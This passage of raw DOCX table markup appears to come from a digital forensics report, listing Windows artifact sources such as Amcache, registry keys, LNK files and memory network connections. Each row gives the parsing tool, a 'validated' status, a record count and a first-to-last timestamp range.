              </w:rPr>
              <w:t>99</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:51</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:06.065288</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.191578</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: logon sessions</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>93</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:04</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:10:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (programs)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>92</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-17 00:00:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:32:13.933886</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: network connections (netscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>90</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:08</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:15</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LNK files</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>LECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>77</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:08:13</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:21</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: BAM/DAM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>66</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:32.703156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:11:09.256094</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>SIDR</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>62</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 22:47:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:47:48</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>BAM (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>62</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 04:58:32.703156</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:52:13.740637</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: network connections (netstat)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Volatility 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:24:08</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:13:28</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:48:07.597314</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:54.058000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd, complementary batch)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:15:08.096469</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:56.145644</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>setupapi.dev.log</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>plaso</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:48:46.736000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:09:00.019000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: Uninstall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>37</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:17:27.195439</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:34.317074</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (shortcuts)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>AmcacheParser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>35</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:32:13.965081</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:32:14.011950</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: RecentDocs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>31</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-18 05:56:32.861839</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:13:21.865279</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: App Paths</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>RECmd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2019-12-07 09:15:13.221620</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 01:31:06.467991</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
